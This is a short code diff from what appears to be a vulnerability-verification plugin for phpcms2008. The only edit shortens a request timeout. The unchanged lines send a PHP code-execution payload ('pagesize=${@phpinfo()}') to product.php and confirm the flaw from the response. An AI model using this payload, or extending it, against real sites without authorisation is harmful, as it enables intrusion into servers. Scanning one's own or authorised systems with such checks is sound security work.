@@ -22,7 +22,7 @@ class phpcms_product_code_exec_BaseVerify:
         payload = "/yp/product.php?pagesize=${@phpinfo()}"
         vulnurl = self.url + payload
         try:
-            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
+            req = requests.get(vulnurl, headers=headers, timeout=4, verify=False)
             if r"Configuration File (php.ini) Path" in req.text:
                 cprint("[+]存在phpcms2008 product.php 代码执行漏洞...(高危)\tpayload: "+vulnurl, "red")
                 return True, vulnurl, "phpcms2008 product.php 代码执行", payload, req.text
